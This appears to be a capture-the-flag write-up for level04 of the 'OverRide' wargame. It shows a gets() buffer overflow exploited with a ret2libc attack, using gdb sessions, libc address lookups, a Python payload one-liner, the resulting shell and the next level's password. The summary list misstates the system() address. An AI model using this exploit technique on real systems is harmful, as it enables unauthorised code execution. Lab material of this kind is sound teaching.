
# Walkthrough

**Main** : 
this program is meant to demonstrate how a parent process can use ptrace to monitor and control the execution of a child process. 
It prevents debugging of the child process and block the use of the execve system call. 
However, it contains a security vulnerability due to the use of gets(), which can lead to buffer overflow  and shellcode  in the child process, we going to exploit this vulnerability 



**Process to exploit :**
>   1. **Find the offset**. 
>   2. **Method RET2LIBC** 
>  3. **Load payload**


## Step 1

###  Find the Offset

```
level04@OverRide:~$ gdb level04 
...
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 6028]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 6028]
0x41326641 in ?? () 
```

the offset is `0x41326641` = 156

## Step 2

### Set environnement variable
like the parent process block the use of the execve system call in child process 
We going to use method **RET2LIBC**   Instead of directly executing shellcode, the attacker leverages existing code in the program's memory. 
They often target the C standard library (libc) functions that are already loaded in memory, such as system(), exit()

**Utile command:**

 1. The command `info proc map` in GDB is used to display the memory map or memory layout of the currently debugged process. It provides information about the memory regions used by the process, such as code, data, stack, and shared libraries.
 2. This command sets GDB to follow the child process when a fork is executed
 3. x/s address :  is used to examine memory at a specific address it's attempting to print a string located at the specific memory address 
we need the address of the follow item from the libc memory 

 **We need the address of the follow item from the libc memory  Address**  : 
  -  system   
 - exit          
 - /bin/sh  

```
level04@OverRide:~$ gdb level04 
...
(gdb) set follow-fork-mode child
(gdb) info function system
(gdb) r
Starting program: /home/users/level04/level04 
[New process 6374]
Give me some shellcode, k
^C

<--make pause to the program while it's running with `CTRL+C` to interrupt the program.-->

(gdb) info function system
...
0xf7e6aed0  system

(gdb) info function exit
...
0xf7e5eb70  exit

(gdb) info proc map
process 6455
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	...
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	...

	(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
	0xf7f897ec
	1 pattern found.
	(gdb) x/s 0xf7f897ec 
	0xf7f897ec:	 "/bin/sh"
```

**Address** 
 -  system   =  0xf7f897ec
 - exit          =  0xf7e5eb70
 - /bin/sh =  0xf7f897ec 


## Step 3

### Load payload

```
level04@OverRide:~$ (python -c "print 156 * 'A' + '\xf7\xe6\xae\xd0'[::-1] + '\xf7\xe5\xeb\x70'[::-1] + '\xf7\xf8\x97\xec'[::-1]" ; cat) |./level04
Give me some shellcode, k
ls
ls: cannot open directory .: Permission denied
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
